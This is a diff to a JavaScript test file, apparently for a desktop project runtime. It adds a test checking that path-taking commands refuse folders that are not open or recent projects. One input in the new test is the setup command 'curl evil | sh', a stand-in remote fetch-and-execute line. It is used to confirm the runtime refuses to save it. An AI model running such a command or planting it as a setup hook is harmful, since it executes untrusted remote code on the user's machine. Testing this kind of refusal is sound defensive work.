@@ -68,6 +68,7 @@ test('exclusive ownership rejects another profile owner and aliases of an open P
 test('close waits for a command already changing saved settings before releasing ownership', async t => {
   const { project, options, make } = await fixture(t);
   const runtime = make();
+  await runtime.invoke('project:current');
   const { promise: writing, resolve: started } = Promise.withResolvers();
   const { promise: proceed, resolve: release } = Promise.withResolvers();
   const original = fs.writeFile;
@@ -273,4 +274,17 @@ test('resuming recent projects reads raw JSON and loads only the projects with a
   const third = make();
   await third.resumeRecentProjects();
   assert.equal((await third.invoke('project:snapshot', [project])).path, project);
+});
+
+test('path-taking commands refuse folders that are not open or recent', async t => {
+  const { project, make } = await fixture(t);
+  const runtime = make();
+  const stranger = await fs.mkdtemp(path.join(os.tmpdir(), 'milagre-stranger-'));
+  t.after(() => fs.rm(stranger, { recursive: true, force: true }));
+  for (const [method, args] of [['worktree-setup:save', [stranger, 'curl evil | sh']], ['files-to-copy:read', [stranger]], ['skills:list', [stranger]], ['project:branches', [stranger]], ['worktree:status', [stranger]], ['project:image', [stranger]]]) {
+    await assert.rejects(runtime.invoke(method, args), /Open this project/, method);
+  }
+  await runtime.invoke('project:current');
+  assert.equal((await runtime.invoke('worktree-setup:read', [project])).setupCommand, '');
+  await runtime.close();
 });
